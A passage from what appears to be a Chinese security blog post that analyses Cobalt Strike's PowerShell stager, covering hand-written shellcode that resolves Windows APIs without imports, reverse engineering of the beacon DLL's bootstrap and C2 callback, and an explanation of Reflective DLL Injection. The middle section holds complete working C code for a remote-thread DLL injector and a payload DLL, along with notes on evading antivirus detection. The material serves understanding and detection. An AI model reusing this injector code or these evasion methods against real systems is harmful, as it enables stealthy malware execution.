            pFunName\[5\] \== 'o' && pFunName\[6\] \== 'c' && pFunName\[7\] \== 'A' && pFunName\[8\] \== 'd' && pFunName\[9\] \== 'd' &&  
            pFunName\[10\] \== 'r' && pFunName\[11\] \== 'e' && pFunName\[12\] \== 's' && pFunName\[13\] \== 's')  
        {  
            //根据函数名在序号表找到对应的序号，根据序号从而在导出函数真实地址表里面找到真实地址  
            pRet \= (FARPROC)(lpdwFunAddr\[lpword\[dwLoop\]\] + (DWORD)hModuleBase);  
            break;  
        }  
    }  
    return pRet;  
}  
​  
int main() {  
    char messagesbox\[\] \= { 'M','e','s','s','a','g','e','B','o','x','A' };  
    typedef FARPROC(WINAPI\* FN\_GetProcAddress)(  
        \_In\_ HMODULE hModule,  
        \_In\_ LPCSTR lpProcName  
        );  
    //找到getprocaddress的地址  
    FN\_GetProcAddress fn\_GetProcAddress \= (FN\_GetProcAddress)\_GetProcAddress((HMODULE)getKernel32());  
    char szLoadLibraryA\[\] \= { 'L', 'o', 'a', 'd', 'L', 'i','b','r','a','r','y','A', 0 };  
​  
    typedef HMODULE(WINAPI\* FN\_LoadLibraryA)(  
        \_In\_ LPCSTR lpLibFileName  
        );  
    //找到loadlibrary的地址  
    FN\_LoadLibraryA fn\_LoadLibraryA \= (FN\_LoadLibraryA)fn\_GetProcAddress((HMODULE)getKernel32(), szLoadLibraryA);  
​  
    typedef int (WINAPI\* FN\_MessageBoxA)(  
        \_In\_opt\_ HWND hWnd,  
        \_In\_opt\_ LPCSTR lpText,  
        \_In\_opt\_ LPCSTR lpCaption,  
        \_In\_ UINT uType);  
    char szUser32\[\] \= { 'U', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };  
    char szMessageBoxA\[\] \= { 'M','e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };  
    char hello\[\] \= {'h','e', 'l', 'l', 'o', 'g', 'a', '0', 'w', 'e', 'I', 0};  
    //找到messageBoxA地址  
    FN\_MessageBoxA fn\_messageBoxA \= (FN\_MessageBoxA)fn\_GetProcAddress(fn\_LoadLibraryA(szUser32), szMessageBoxA);  
    //调用  
    fn\_messageBoxA(0, 0, hello, 0);  
    return 0;  
}  
​
```

里面有些小细节，比如我们的字符串变量不能是存储在资源段数据段里面。

这段代码就是把上面不依赖导出表来调用api的思路的实现，利用LoadLibrary和GetProcAddress来调用一个MessageBoxA的api：

运行：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-636de7949d325a006d61e1abb427844807214ec0.png)

接下来我们尝试把这堆机器码随便丢到一个exe里面看下能不能执行：这里图省事，就不注入到exe里面，通过hook相关去执行了；而是直接丢到od里面，修改下eip跑下：

首先我们先拿到shellcode的机器码：

将生成的exe丢到01editor里面：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-289ad622be58030cfb1829910e72b378d3c4f9af.png)

代码节的文件开始位置：0x400

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-658c2cb3ace27d5f0c4985fce2e50c825d27234d.png)

复制多长呢，这里我们去看下上面我们代码的反汇编最后的机器码特征：如下（或者这里我们也可以看长度来判断shellcode结束的位置）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7001728991de8dd0e3af3bfc9ca5a0e506d503c3.png)

如上图看到最后特征码是`33c05e8be55dc3`,找到即可：

最后找到的shellcode如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-1440eab27d8690ca812a24d9c7d0e01360d67d12.png)

复制16进制：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c2724cab119de0b6f47df1734b4e9d0c11448654.png)

然后随便找个exe，使用od，打开：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-521c0611829c7e23f331e2baa9d7aee0bfdd589e.png)

在od中找块空的地方：如下图`0045d900`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e90c68a7fecb6aba9b8b55004e2a0a3d84b8b84f.png)

复制进去shellcode：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c966560a9de1ed29e44a7d96d763a43a42c50536.png)

将eip修改过来：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e7aa3a30f0e3a2897dd19bed8b73f4007f9f4efc.png)  
在最后调用Message的时候打个断点：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-55cbef887a1d3242f2481693dbfec643b4841206.png)

运行：F9+F8

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b0f3fc5f201983ff41e293129ebd5e232b3e34eb.png)

说明我们shellcode没啥问题，不依赖环境。配置shellcodeloader可以直接使用了。

最后我们再回到上面cs ，powershell上线里面：上文分析其相关逻辑，发现就是实现了一个shellcodeloader，shellcode加载器。

所以对应的var\_code解密之后应该就是一个shellcode，但是为啥上面的分析出来之后是个dll文件呢？

带着这个疑问，这里笔者又去学习了下dll注入相关的技术:

0x06 dll注入学习
============

**经典的dll注入场景有三种：**

1、通过远程创建线程，来实现dll的注入（最常见的），原理是利用CreateRemoteThreat，传入的执行方法为LoadLibrary，来加载我们的dll，然后触发dll里面的dllmain方法，在其中实现我们要执行的恶意代码，这里就比较随意了，不用使用shellcode，可以直接使用api之类的，因为这个dll是被加载到了目标进程里面，里面的导出表，重定向表啥的，都可以用，就没shellcode那么复杂了。

2、通过AppInit\_DLLs来实现，将我们要加载的dll，修改注册表写到AppInit\_DLLs项目里面，原理就是利用user32.dll加载的时候会附带加载我们的恶意dll，所以只要加载了user32.dll的进程都会加载我们的dll，笔者记得之前在《恶意软件、Rookit、和僵尸网络》一书中看到书中将这种方法叫全局hook，顾名思义就是影响范围广嘛。

3、通过Windows消息钩子（Message Hook）来实现注入，一般是使用SetWindwosHookEx这个api来实现。

**这里对我们分析cs powershell上线有用的是第一种方式：**

这里我们来测试下通过第一种方式来实现dll注入，使一个正常运行的exe执行我们的代码：

一、远程进程注入实现dll注入
---------------

这个方法里面一共有三个实体，一个是宿主进程，一个是恶意dll，一个是注射器进程：

思路：当宿主进程在正常运行的时候，运行注射器进程，从而将恶意dll注入到宿主进程，并且宿主进程执行恶意dll里面的dllmain方法。

这里我们下面做实验的时候选取的宿主程序是：reg这个exe

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-9b240a4b0fe0230b28a1a5df2c8e4e212f2f299d.png)

### 1、 构造恶意dll，开发自己的恶意dll

dllmain方法里面实现要注入的代码

### 2、构造注射器

1、找宿主程序的pid

2、使用VirtualAllocEx在宿主程序处开辟一个dll路径长度大小+1的空间

3、使用WriteProcessMemory方法，将dll路径字符写到宿主程序

4、拿到kernel32.dll里面的loadlibrary的起始位置（GetProcAddress）

5、CreateRemoteThreat（关键的三个参数，1：宿主程序·的Handle，2、调用的方法（loadlibrary），3、传入的参数（注意这里的参数要是在宿主程序里面的地址，这也是为什么我们在之前要将dll路径写到宿主程序里面的原因））

6、Loadlibrary触发dllmain里面第二个参数为DLL\_PROCESS\_ATTACH的场景

（dll里面的DllMain被调用的场景：1、loadlibrary的时候，也就是该dll被加载映射进进程的内存空间的时候【DLL\_PROCESS\_ATTACH】，2、解除映射的时候也就是FreeLibrary的时候【DLL\_PROCESS\_DETACH】，3、进程中创建新的线程的时候【DLL\_THREAD\_ATTACH】，4、相关线程结束的时候【DLL\_THREAD\_DETACH】）

### 3、恶意dll的实现

核心代码：

```php
#include "stdafx.h"  
#include "InjectionDLL.h"  
#include <iostream>  
#include <thread>  
​  
​  
​  
//这里的这个进程过程方法，要满足两个条件，返回是一个DWORD对象，出入的参数是一个LPVOID对象  
DWORD WINAPI Mycode(LPVOID lParam)  
{  
    MessageBoxA(0, 0, "run in maindll fun", 0);  
    return 0;  
}  
BOOL APIENTRY DllMain( HMODULE hModule,  
                       DWORD  reson,  
                       LPVOID lpReserved  
                     )  
{  
​  
​  
    DWORD dwThreadId;  
    HANDLE hHANDLE;  
    switch (reson)  
    {  
        // 加载dll的时 ，loadlibrary  
        case DLL\_PROCESS\_ATTACH:  
            printf("DLL\_PROCESS\_ATTACH");  
            printf("Dll injected");  
            //Mycode(NULL);   //do some eval thing  ,the best modify is create a thread to   
            hHANDLE \= CreateThread(NULL, 0, Mycode, NULL, 0, NULL);  
            CloseHandle(hHANDLE);  
            break;  
        //当进程创建一线程时，系统查看当前映射到进程地址空间中的所有DLL文件映像  
        case DLL\_THREAD\_ATTACH:  
            printf("DLL\_THREAD\_ATTACH");  
            break;  
        case DLL\_THREAD\_DETACH:  
            printf("DLL\_THREAD\_DETACH");  
            break;  
        case DLL\_PROCESS\_DETACH:  
            printf("DLL\_PROCESS\_DETACH");  
    }  
    return TRUE;  
}
```

### 4、注射器的实现

核心代码：

```php
#include <Windows.h>  
#include <iostream>  
#include <TlHelp32.h>  
using namespace std;  
​  
void PrivilegeEscalation();  
HANDLE GetThePidOfTargetProcess();  
BOOL DoInjection(char \*InjectionDllPath, HANDLE injectionProcessHandle);  
int main()  
{     
    //待加载dll的绝对路径，最后注入到远程进程中  
    char InjectionDllPath\[\] \= { "F:\\\\text\\\\InjectionDLL.dll" };  
    //获取到宿主进程的句柄  
    HANDLE injectionProcessHandle \= GetThePidOfTargetProcess();  
    if (injectionProcessHandle \== 0)  
    {  
        cout << "not get pid" << endl;  
    }  
    if (DoInjection(InjectionDllPath, injectionProcessHandle))  
    {  
        cout << "Inject Success" << endl;  
    }  
    else  
    {  
        cout << "Inject Failed!" << endl;  
    }  
    system("pause");  
}  
​  
HANDLE GetThePidOfTargetProcess()  
{  

    //获取到Reg为窗口的进程句柄  
    HWND injectionProcessHwnds \= FindWindowA(NULL, "Reg");  
    cout << "Reg handler -> " << injectionProcessHwnds << endl;  
    DWORD dwInjectionProcessID;  
    //通过窗口的句柄拿到pid  
    GetWindowThreadProcessId(injectionProcessHwnds, &dwInjectionProcessID);  
    cout << "Reg pid -> " << dwInjectionProcessID << endl;  
    //通过openprocess传入pid，从而拿到对应进程的句柄  
    HANDLE injectionProcessHandle \= ::OpenProcess(PROCESS\_ALL\_ACCESS | PROCESS\_CREATE\_THREAD, 0, dwInjectionProcessID);//dwInjectionProcessID);  
    return injectionProcessHandle;  
}  
​  
BOOL DoInjection(char \*InjectionDllPath,HANDLE injectionProcessHandle)  
{  
    // dll文件的绝对路径的长度  
    DWORD injBufSize \= lstrlen((LPCWSTR)InjectionDllPath) + 1;  
    // 在远程进程中开辟空间  
    LPVOID AllocAddr \= VirtualAllocEx(injectionProcessHandle, NULL, injBufSize, MEM\_COMMIT, PAGE\_READWRITE);  
​  
    if (AllocAddr \== 0)  
    {  
        cout << "Memory Alloc Failed!" << endl;  
    }  
    else  
        cout << "Memory Alloc Success" << endl;  
    //写到远程进程的空间里面  
    WriteProcessMemory(injectionProcessHandle, AllocAddr, (void\*)InjectionDllPath, injBufSize, NULL);  
    //报错  
    DWORD ER \= GetLastError();  
    //找的loadlibrary的地址，之后调用使用  
    PTHREAD\_START\_ROUTINE pfnStartAddr \= (PTHREAD\_START\_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");  
    cout << "The LoadLibrary's Address is:" << pfnStartAddr << endl;  
    HANDLE hRemoteThread;  
    //CreateRemoteThread在远程进程中创建线程，传入的两个关键参数，远程进程的句柄和线程执行的过程以及该执行过程的参数，这个参数就是dll文件的字符串。  
    if ((hRemoteThread \= CreateRemoteThread(injectionProcessHandle, NULL, 0, pfnStartAddr, AllocAddr, 0, NULL)) \== NULL)  
    {  
        ER \= GetLastError();  
        cout << "Create Remote Thread Failed!" << endl;  
        return FALSE;  
    }  
    else  
    {  
        cout << "Create Remote Thread Success!" << endl;  
        return TRUE;  
    }  
}  
​
```

最后生成：如下两个文件，一个是注入exe，一个是有我们要执行代码的dll

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2caa8acd6847c6417563ace3bc2ed765a50cfc5d.png)

这里我们要将dll放到上面再注射器exe里面写死的位置：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c1b1e99c713b9389229c6ba0e69ac2666a35d8d5.png)  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2f800b40fbc64706f395314fa1356d0ca3110b5a.png)

然后运行reg.exe，然后运行CommonInjection.exe:如下图，可以看到我们dll里面的dllmain方法里面调用的MessageBoxA被调用了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-5f3573e8f7162541ede21f1fb13f496a8249390e.png)

此时我们打开ProcessExplorer查看Reg.exe载入的模块，发现InjectionDLL.dll已经载入进去了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7c847b755079ef39bdef74b480482a28bc57bbc6.png)

或者通过查找搜索dll:

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-34a6c0de8eb375a15d93021147cc4aaf2e244ded.png)

### 5、总结：

上面便是远程进程注入实现dll的注入，实质上就是在宿主进程上创建了一个新的线程，新的线程执行了我们写的恶意代码。

**整个过程最关键的一步也是最巧妙的一步**：

就是我们调用CreateRemoteThread这个api来在远程进程中创建线程的时候，要传入一个过程方法，创建的线程就会去执行这个过程方法（对这个方法是有两个限制的，返回值和参数类型要满足条件）。这里我们想一下，这个过程方法可以是我们自己在“注射器”程序中写好的函数方法吗？

答案是：必然不可以的，

因为这个函数方法是没办法再宿主程序中执行的。那怎么办呢？这里巧妙又巧合的是，LoadLibraryA这个方法是突破口：

1、LoadLibraryA这个api是系统api，再kernel32.dll里面，所以宿主程序中可以直接调用

2、LoadLibraryA这个api的返回参数和传入参数类型和CreateRemoteThread这个api需要传入的方法符合

3、LoadLibraryA这个api是一个模块的dllmain方法被调用的方法之一，也就是说，如果我们调用LoadLibraryA(my.dll)，那么就会触发my.dll模块里面的dllmain方法。这里正是因为这个条件，我们可以直接再dllmain方法里面写要执行的恶意代码，这里可以直接写，不用像shellcode那么麻烦。

所以这里完美的解决了CreateRemoteThread使用方法的问题，除此之外，就是我们这里的dll是在磁盘上的，所以我们加载的时候要传入绝对路径才行。而这个绝对路径我们在“注射器“程序中写没用，要写到宿主程序里面才行，所以在调用LoadLibraryA之前，我们通过WriteProcessMemory写到远程进程里面去了。

这种通过船舰远程线程的方法来实现dll注入，是非常容易被查杀的，首先我们加载的dll是第三方的dll，其次我们的恶意dll是在文件系统上的，杀毒软件很容易发现并阻止。于是这种技术出现了一次更新升级：

Stephen Fewer这个大佬在2010年左右就提出了**Reflective DLL Injection**

二、Reflective DLL Injection
--------------------------

正如我们所了解的，上面注入的关键在于LoadLibrary方法，这个方法是系统win api，所以宿主程序能调用。（也正是因为如此，杀毒软件只要检测在通过CreateRemoteThreat方法传入LoadLibrary方法这种场景以及在某进程中通过LoadLibarary动态加载dll，并对dll文件位置进行检测，那么很容易被检测到了）

那么我们是不是能构造一个能和CreateRemoteThreat配合的方法，并且这个方法是在宿主进程中能被使用的呢，这样的话问题就解决了，所以现在的问题就是怎么在宿主进程中构造一个能够被CreateRemoteThreat所调用的方法呢（CreateRemoteThreat方法的第二个参数），这里我们可以通过在”注射器“进程中使用WriteProcessMemory这个api，来在宿主进程中写入想要的方法，但是有一个问题，这里的写的方法过程全程得用shellcode，那么就实现了在宿主进程中调用我们shellcode的这个思路。

那其实这整个过程和dll注入就没啥关系了，上面这种方法叫代码注入，并且我们又回到了要使用shellcode的要求来编写那个方法了。这当然不是我们所说的Reflective DLL Injection，但是这里的思路差不多，异曲同工。

Stephen Fewer这个大佬提出的方法是：在”注射器“进程中通过WriteProcessMemory来将一个dll文件写到宿主进程空间里面（注意这里就是直接写dll文件内容进去，不是映射进去，所以这个dll是没有办法正常使用的），这个dll模块存在一个导出函数ReflectiveLoader，在CreateRemoteThreat方法的参数里面传入ReflectiveLoader函数的“真实地址（开辟空间的基址+ReflectiveLoader这个函数的文件偏移地址）”，这里的ReflectiveLoader函数的参数和返回类型是dll中构造好的，和LoadLibrary一样，也符合CreateRemoteThreat对方法参数的要求，那么关键点来了，这个ReflectiveLoader里面做了什么呢,这个也是这个技术最关键的，在ReflectiveLoader中干了一个LoadLibrary差不多的事情，将写到宿主进程中的dll文件内容展开，“加载”到宿主进程中（这里的加载其实有很多步，下文我们详细来看看一个dll加载到进程中要干些啥），最终使dll成为正常的模块被使用，然后再ReflectiveLoader的最后调用Dllmain方法（dll中ep所在的点就是Dllmain函数的起始地址）。所以通过这样一系列操作，我们就可以再dllmian方法中实现我们想要写的任意代码了，可以随意调用win api，不用使用复杂的shellcode。

以上是理论的推演，技术由来和技术实现的描述，接下来我们来看看其实现的步骤：

这里笔者参考Stephen Fewer这个研究院的开源代码：<https://github.com/stephenfewer/ReflectiveDLLInjection>

写下大致的实现步骤，其实最关键的就是不使用LoadLibrary，自己使用c实现LoadLibrary要干的活：

这个开源项目有两部分代码：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a4daffc73a431ba22bb1954bc87905058dab326f.png)

- 1、`inject`是“注射器”进程的实现。
- 2、Reflective\_dll是待注入的dll的实现。

笔者看到国内网上很少有写详细分析的文章，基本都是大佬一笔带过。

所以下面是笔者看Stephen Fewer的ReflectiveDllInject项目之后总结的：

从下面两个方面的实现来分析下思路和过程：

### 1、“注射器“进程的实现思路：

这里的思路和上面我们普通dll注入思路没啥区别，就不结合代码来看了，和上面的普通dll注入差不多，唯一的区别在于下面第3步：

1.1、使用OpenProcess拿到宿主进程的句柄。

1.2、再宿主进程中使用Virtualalloc开辟一个空间，使用WriteProcessMemory写入构造好的reflective\_dll文件

1.3、拿到reflective\_dll文件内容中ReflectiveLoader函数的真实地址（ReflectiveLoader的文件偏移地址+开辟空间的基地址）

1.4、调用CreateRemoteThread再宿主进程中开辟线程，其中参数lpStartAddress，传入dll中ReflectiveLoader函数在宿主进程中的真实地址。

1.5、执行ReflectiveLoader函数里面的内容。

### 2、待注入的dll的实现思路：

这里的核心就是ReflectiveLoader的实现：

2.1、找到被（以文件形式）写到宿主进程中dll的基址（思路就是从ReflectiveLoader这个函数的开始地址一直往上找，找"MZ 4D5A"—&gt;找3C偏移--&gt;找”PE 5045“），这个基址在后续都要使用，用来找一些位置，比如下面2.3中的可选pe头中的SizeOfImage等，这里有一个小细节，其实这个基址我们是有的，在注射器进程中我们通过VirtualAlloc开辟空间的时候返回的就是这个基址，但是这里并没有选择在调用ReflectiveLoader的时候传入这个参数，这个作者传入的是另一个字符串指针，最后被dllmain所使用，笔者理解作者为啥要这么做就是为了增加这个dllmain的”可玩性“;

2.2、通过fs寄存器的方法来在宿主进程中找到，我们之后要用的几个函数地址，如：LoadLibraryA &amp;&amp; GetProcAddress &amp;&amp; VirtualAlloc &amp;&amp; NtFlushInstructionCache（这里的方法在0x05shellcode的编写里面讲过了就不细说了）;

2.3、利用在2.2中找到的VirtualAlloc方法，在宿主进程中申请一块（dll文件中的可选pe头中SizeOfImage属性大小）空间；（从这里开始到下面的2.7 就都是在实现将宿主进程中文件格式的dll，加载成正常的模块了，简单理解就是在实现LoadLibrary的内容，只不过这里特殊一点，不是load的一个磁盘上的文件，而是进程空间的dll文件）

2.4、将dll的头复制到开辟空间的头部

2.5、将各节区，从文件格式拓宽成内存格式写到开辟空间里面

2.6、根据我们的从2.2中获取的 GetProcAddress来还原导入表，因为我们内存中展开的dll其导入表里面仍然是双桥结构（IAT=INT），所以我们要修复IAT，这里其实就是便利导入表，将要用到的函数每个地址找到，然后赋值给IAT。

2.7、修复重定向表

2.8、调用通过上面3-7所加载的模块的dllmain方法（这里就是跳转到dll的ep，就是dllmain）

2.9、在dllmian中根据不同场景来实现我们想要实现的代码，因为这里传入参数都是我们可控的，想怎么写怎么写

看完上面的思路，应该就明白为啥这个叫反射dll注入了，自己还原（从文件格式映射成内存并且完成修复导入表重定向表加载之类操作）自己

如下图是笔者借鉴稀土掘金技术社区的图片，构画的一张ReflectiveDllInjection思路的总图：

其中绿色的是第一部分”注射器进程“代码完成的：

其中蓝色的是第二部分”宿主“进程中新建线程的来完成的：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e32d55b378fe4ef92ac545267fa07a53f1883d2f.png)

其中最为经典的就是ReflectiveLoader的实现，感觉读下这个的源码还是很有必要的。

### 3、总结：

对于这个Reflective DLL Injection这个技术最直观的就是，宿主进程在整个过程中没有使用落地的DLL文件，是直接在内存中开展的操作，所以可以绕过之前的普通dll注入场景的检测方法，还是比较巧妙的。

好了到这我们技术铺垫就差不多，言归正传，我们回到cs的powershell上线的研究，上文通过“0x04中的分析代码逻辑”我们发现是里面其实就是实现了一个powershell的shellcodeLoder，也就是shellcode加载器，但是加载的内容不是shellcode，而是一个dll文件。

0x07 powershell中的DLL分析
======================

一、dll分析
-------

shellcode是一串机器码，所以这里的dll也一样会被当成机器码来执行，所以这里我们来看下这个dll文件头，看看转成机器码有没有什么说法：

**注意：这里我们下面都是拿32位的payload来分析的，因为在实战中32是能被64位兼容的：**

即在生成powershell上线的时候不勾选x64：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-bbb2ab96fc160dcbce1762d9f0de6488acadb797.png)

我们将获取到的dll重命名位final32.dll，使用ida打开，选择以binary方式打开：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c0e46ad4b0589066201cb6212d80e189d7e07501.png)

将开头都转成机器码（按快捷键c就可以了）：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-1374c3eb99a00f9147eb13783c6370b504da92a7.png)

转化后：如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-25be0bad9ab48ba8dad831fc70d1ba2964049f97.png)

这里可以看到开头有两个call，我们来逐句分析下对应机器码：

开头两句，没啥好说的是DLL的dos头”MZ“得来的，ebp-1，出栈esp指向的值给edx；

```php
dec ebp            ; ”M“  
pop edx            ; ”Z“
```

接着如下，两句，call $+5,这里就是调用当前call指令开始位置往下偏移5的位置，call命令本身就是5个字节，所以就是调用下一条语句，但是call执行的时候会有压栈操作，会把下一条待执行代码（eip+1）地址压栈，函数返回使用，所以这里和下面pop ebx，连在一起就是把pop ebx这条指令的地址给到ebx

```php
call $+5            ;跳转到下一条语句，将下一条语句的地址入栈  
pop ebx             ;栈顶的地址赋值给ebx
```

接着，如下，注意观察的话会发现这两条和开头MZ那两条其实就是相反的操作，从而恢复了ebp和栈堆的值

```php
push edx            ; 恢复栈堆，将edx丢回去  
inc ebp             ; 恢复ebp
```

接着，如下，push ebp；mov ebp, esp ； 这两句就很熟悉了，就是进入函数方法之后的刚开始的堆栈平衡了，开新的栈

```php
push ebp            ; 保存ebp  
mov ebp, esp        ; 切换堆栈
```

接着如下，ebx+0x8150，然后call ebx

```php
add     ebx, 8150h  
call    ebx
```

之前edx的文件偏移位置是0x0007：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7380315a8e1241d3f83ebb9f3c32babe78ee31e8.png)

加上0x8150之后，对应函数地址的文件偏移就是0x8157了，我们来看看0x8157偏移位置的这个方法：如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-11de21b42b03eefc2197ad2c1b69fc9f9bceb01d.png)  
这里我们从文件偏移来计算下内存偏移，0x8157-0x400+0x1000=8d57 ；然后我们再重新打开ida，选择以PE文件打开：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-11f3c6b6b9f430593faae3819e199a81a09ce9ca.png)

找到10008d57（ida的默认加载基址为10000000）：如下图，可以看到这里是个叫ReflectiveLoader的导出函数

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6b033c6ef0fccb0b3cf0b963c9278d760962a9ee.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-245c114c99e4df0c25701bef9343926d7b08d091.png)

代码还原下（f5大法）：代码挺多的这里我们就先不往下看了

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3f397334966d945e82132ffd493d9eed43cf7449.png)

二、结论：
-----

其实分析到这我们就差不多明白了些什么了，这里我们先不着急去读这个ReflectiveLoader的实现。

我们通过分析CS powershell中还原出来的代码，对该DLL DOS头部分的代码进行分析发现，这里的头部其实就是在调用后面的ReflectiveLoader方法，通过之前在DLL注入中的ReflectiveDllInjective项目的学习，我们知道这个ReflectiveLoader其实就是在加载自己，将这个DLL加载到进程中（就相当于LoaderLibrary），并且最后调用DllMain方法。所以上面一堆的ReflectiveLoader的机器码其实就是和我们在**0x06dll注入学习**里面ReflectiveDllInject里面ReflectiveLoader是一样的。最后在DllMain方法里面执行自己想执行的代码逻辑。至于逻辑是什么怎么执行这就是和cs配套的了，我们后续再说。（整个过程宿主进程就是本身执行powershell这个进程，就变成了宿主进程自己加载自己。。。。。。）

这种技术在2015年就被Dan Staples这个研究员提出来了，通过Dos头中的引导程序来实现这一点自加载。

这里我们在ida里面f5下DllMain方法：如下，这里代码还原出来是通过if来判断传入的fdwReason参数，来调用不同的方法，（其实可能应该是switch，代码还原器这个可能有些bug，之前看b站上看一个up主`逆向老钱`的一场直播的时候，他直播通过读机器码还原投稿的exe代码，也翻车了，把while变成了还原成了if，虽然逻辑上没啥区别，但是这两者在本质上肯定是有区别的，包括这里的switch），大概就是两条路，一个是当调用该方法传入的fdwReason参数为1的时 候，调用sub\_10009C43；下面的fdwReason为4的情况，简单分析下是对后续的处理，判断对内存的权限从而来释放之前使用virtualAlloc开辟的空间之类的，具体其DllMain中的代码实现逻辑是怎样的，之后我们结合cs的teamserver端源码看，从beacon和teamserver之间的详细通信过程来看会更好理解些。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-416fe6a60013b1e477f831f127e4701a40a59168.png)

三、结合teamserve和beacon直接的通信协议，深入分析final.dll DllMain的实现
----------------------------------------------------

笔者之前在奇安信攻防社区写过一篇分析cs httpbeacon上线流量分析的文章[《Cobaltstrike4.0 学习——http分阶段stagebeacon上线流量刨根问底》](https://forum.butian.net/share/1861)，此文中有写到，beacon和teamserver之间的通信过程，本文我们分析切入的点，如下图就是那片文章中第七步开始的点：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-00e45f34d87f7de3a1ef24848ca10b412def9a77.png)

所以我们接下来分析dllmian方法里面的时候，就参考这个来，很明显这个dllmain方法里面要调用网络通信的api，接下来大概就是两种分析思路：

1、利用还原出来的dllmain方法，去分析分析追追，看看能不能找到调用网络通信的点。

2、动态调试下，去追追dllmain调用过程，但是这里有一个问题，笔者的思路就是将dll丢到od里面，我们强制修改eip，使其执行dllmain方法，然后去分析，那么问题就出现了，dllmain方法里面如果使用了一些变量是在重定向表里面的话就不太行，还有就是这里强行改eip，我们还要注意堆栈，笔者试了下很麻烦，老是蹦。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-5d470dc8310d367e9a94978ddb28632239b43481.png)

所以我们接下来还是以分析dllmain的伪代码实现为主：

其实就两条路，关键的两个函数如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-92f697d25f34586b51654d0733a042176563c99f.png)  
最后我们不停的追就会分析发现，这里是sub\_10001388，就是回连后续通信的实现，我们来看看：

如下图是10001388函数的实现，这里伪代码里面我们差不多就看出有点猫腻了，agent、source、serverPort之类的

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6c3f4dba99bf6d4fb8fbb9a8ce934d2cbdc78c38.png)

下面我们来看看在哪调用了：

如下图，我们不分析逻辑，我们只看调用点就行：可以看到是通过一个sub\_10001A69来实现对上面那些参数调用的：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-90b227866d586d29bedb72b8bbc6f04044727374.png)

跟进去看看：如下两图，果然，这里面调用了wininet.dll里面的网络通信api，InternetOpenA之类的，所以基本就是在这里实现回连的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-381e61ca7f419ba088d1de53a840a1b43a102427.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-48f0fada089aac26f12d84cb1ed73501b13eca16.png)

这里我们不去详细分析实现，我们来分析下逻辑，如下图种的第七步心跳请求，这种心跳请求肯定是要重复的，重复的依据就是time，默认设置是60秒，这里我们在10001388是能看到这个循环的过程的：大概就是下面这里：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7d931d7ae80da68a6a056ceb37c684867140e47e.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-385033b76d29d845719367196da3df9f776eb1fe.png)

这里我们没法动态分析，并且变量逻辑啥的都挺乱的，所以就不进一步分析了，比如beacon端接受到任务的时候是怎么解密，判断执行的任务的之类的，后续的话我们直接分析cs的beacon.exe，动态调试的时候再来详细看。

到这我们这个cs 的powershell上线实现的分析就差不多结束了。

0x08 总结
=======

笔者本来只是简单想分析下cs的powershell的实现，然后分析归纳下流量侧特征，后来发现流量侧没啥好分析的，和之前笔者在[cs流量分析](https://forum.butian.net/share/1861) 写的一样，就是将前面分阶段拉取beacon的流量变成了一个http请求获取到要的beacon（shellcodeloader+shellcode），然后就发现这里的shellcode奇奇怪怪的是个dll，从而有了后文，通过这个过程的分析和思考，学到了挺多的东西，同时也挺感慨。

**后续的话会结合cs的相关通信协议来分析beacon.exe（无阶段的上线exe），具体分析下上文中没有讲到的dllmain的详细逻辑之类的。**

**同时之后也准备分析下最近比较火的CS爆出来的漏洞**，这个xss造成rce的漏洞怎么说呢，实质上就是参数没有检查的问题，如下图，借用下网上别人复现的截图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b3af50446949224f1f34459e079187b5e4c3d2eb.png)

